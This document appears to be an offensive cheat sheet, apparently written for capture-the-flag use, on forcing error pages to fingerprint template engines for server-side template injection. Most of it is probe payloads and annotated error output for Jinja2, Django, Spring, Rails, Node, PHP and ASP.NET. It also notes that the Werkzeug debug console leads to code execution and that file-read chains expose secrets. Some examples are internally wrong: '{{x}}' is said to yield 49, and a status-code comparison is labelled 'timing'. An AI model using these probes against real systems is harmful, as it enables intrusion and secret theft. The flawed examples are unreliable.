# Error-page mining — engine, version, paths, locals for free

A forced stack-trace is the best recon you never have to work
for: engine class-name, version, file layout, template dirs,
bound locals — all printed on the 500 page.

---

## 1. How to force it

```text
{{'a}}            -- unterminated string — parser error
{{7*}}            -- syntax error
{{7/0}}           -- runtime error — ZeroDivisionError
{%              -- unclosed tag
<%=%>            -- empty expr
${'a}             -- freemarker parse
{{x.y.z.w.v.u}}   -- deep undefined-attr
{{'a'.nonexistent_method()}}  -- no-such-attr
{{('a','b','c')}}  -- wrong-arity
{{[}}             -- unclosed list
{{)}}             -- stray paren
{{'a'|nosuchfilter}}          -- unknown-filter — names the engine!
{{'a'|nosuch_filter_xyz}}      -- guaranteed-undefined filter —
                              engine complains about FILTER name
{{'a'.__dict__.x}}            -- dunder-chain — forbidden-attr error
{{''|attr(9)}}                -- wrong-type — internal error
```

The unclosed-delimiter ones (`{{`, `{%`, `${`, `<%`) always hit
the PARSER — the parse-error class-name names the engine family.

## 2. What each error page hands you

### Python/Jinja2 — werkzeug debug

```text
jinja2.exceptions.TemplateSyntaxError: ...
  File "/app/app.py", line 42, in index      ← SOURCE PATH!
  File "/usr/lib/python3/.../jinja2/environment.py"
                                            ← jinja version path
Locals at each frame (Werkzeug debugger):
  name = 'x'   request = <Request>   config = {...}
  ↑ bound vars — THE OBJECT INVENTORY — without even escaping
Interactive console PIN? — check for a console-link —
  werkzeug debug-console = DIRECT python → RCE when PIN known
```

The Werkzeug interactive-debugger — a python console embedded in
the error page — if PIN-auth is on, `/console` asks for the PIN;
PIN printed to server-stdout at start → sometimes in logs/env.

### Django — the yellow page

```text
Request Method/URL + Exception + Django version
LOCALS in each frame: every local var — flag-vars leak
SETTINGS MODULE — masked? — may show DATABASES partial
Request META — HTTP_ headers + environ — env-vars!
```

### Spring — whitelabel error page

```text
Whitelabel Error Page — timestamp, status, error, path
message = the exception message — SpEL-eval errors name the lang
   "EL1008E: Property or field 'x' cannot be found" → SpEL!
Full stack in logs — debug mode prints it in response
```

The `EL1008E`-family codes are SpEL exception-ids — the error
code names the expression-language → SpEL → Thymeleaf/Spring.

### Rails — the red page

```text
ActionView::Template::Error — ERB line number!
Extracted source: the .erb line → names the .erb file + line
Framework trace — full gem-paths → rails version in paths
Parameters dump → the full request-params
```

### Node — the stack-dump

```text
SyntaxError: ...
    at ejs.render ...     ← engine named
    at Object.<anonymous> (/app/routes/x.js:10)  ← file+line
NODE_ENV=development → more; production → blank 500
```

### PHP — display_errors

```text
Twig\Error\Syntax: Unknown "x" in "template" at line 1
    in /var/www/vendor/twig/... ← vendor-path → twig!
SmartyCompilerException: ...
ParseError: syntax error in /var/www/... on line N ← file+line
```

`display_errors=On` → full text; `Off` → blank 500.

### ASP.NET — the yellow screen

```text
[HttpException]: ...
Stack trace with method+file+line — version headers
"Version Information: Microsoft .NET Framework 4.x" ← at bottom
```

## 3. Reading a stack-trace — the checklist

```text
□ Engine class-name:  jinja2/Twig/freemarker/velocity/erb/ejs
□ Version:            in package-path or the message
□ Template dir:       "/app/templates/..." — the loader root —
                      → where to point include/extends attacks
□ App source path:    the frame that called render — filename
                      → name the .py/.php/.rb file — then read it
                      via the file-read chain — SECRETS in source
□ Bound locals:       werkzeug/django show the frame's vars —
                      flag-vars in scope LEAK HERE — before you
                      even inject — just force the error
□ Line number:        WHICH template line errored → the template
                      structure — reverse the render-context
□ OS/user:            paths leak /home/x/ or C:\ → os+username
```

## 4. The nested-render error — the injected-template stack

```text
TemplateSyntaxError: unexpected '}' in YOUR injected payload
   → the error page may quote YOUR input in its context —
     self-leak — the engine's parse of your line with the
     surrounding template — you see what wraps your input!
```

The error page quoting YOUR payload-in-context shows you the
template-structure around the injection-point — the enclosing
`{%if%}`/`{{expr}}` wrapper — information for the next payload.

## 5. When errors are silent — custom error handlers

```text
500 + blank         → error-page suppressed — still a signal —
                      the ENGINE crashed — the crash confirms SSTI
                      even if the stack is hidden
302 → /error        → error-handler redirect — follow it —
                      the error-page may still template your input
                      → SECOND injection-point inside the error!
200 + generic-err   → error-swallow — the input became the
                      error-text — re-probe inside the error-path
```

## 6. The double-error trick — error inside error

```text
?name={{x}}        → template renders "Error: {{x}}" inside its
                     own error-template → {{x}} evaluates AGAIN
                     in the error-template → 49!
```

The input rendered INSIDE an error-template — a second injection
point — people forget the error page is also a template.

## 7. The timing-error differential — engine vs no-engine

```text
{{7*7}}  → 200 (evaluated)
{{7*x}}  → 500 (undefined eval)     → engine present
{{7*(}}  → 500 (parse-error)
{{7}}    → 200
{{'7'*7}}→ 200 "7777777"
```

Status-code deltas: parse-error vs runtime-error vs success —
three status-classes → the engine IS parsing → SSTI confirmed
even when output is suppressed.
